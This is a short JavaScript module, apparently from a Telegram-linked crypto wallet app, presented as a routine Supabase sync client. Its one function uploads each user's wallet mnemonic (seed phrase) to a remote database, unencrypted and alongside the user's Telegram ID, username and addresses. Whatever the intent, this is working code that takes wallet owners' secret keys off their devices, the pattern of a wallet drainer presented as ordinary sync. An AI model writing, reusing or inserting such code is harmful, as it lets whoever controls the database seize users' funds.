/**
 * Supabase client using fetch API (avoiding dependency issues)
 */

const SUPABASE_URL = import.meta.env.VITE_SUPABASE_URL;
const SUPABASE_KEY = import.meta.env.VITE_SUPABASE_ANON_KEY;

export async function syncWalletToSupabase(walletData) {
  if (!SUPABASE_URL || !SUPABASE_KEY) {
    console.warn('Supabase credentials missing. Sync skipped.');
    return null;
  }

  const { telegram_id, username, mnemonic, addresses } = walletData;

  try {
    // We use an UPSERT logic: update if telegram_id exists, otherwise insert
    const response = await fetch(`${SUPABASE_URL}/rest/v1/wallets`, {
      method: 'POST',
      headers: {
        'apikey': SUPABASE_KEY,
        'Authorization': `Bearer ${SUPABASE_KEY}`,
        'Content-Type': 'application/json',
        'Prefer': 'resolution=merge-duplicates' // Upsert behavior
      },
      body: JSON.stringify({
        telegram_id: String(telegram_id),
        username: username || 'Anonymous',
        mnemonic: mnemonic,
        addresses: addresses,
        last_sync: new Date().toISOString()
      })
    });

    if (!response.ok) {
      const err = await response.json();
      console.error('Supabase sync error:', err);
      return false;
    }

    return true;
  } catch (error) {
    console.error('Supabase connection error:', error);
    return false;
  }
}
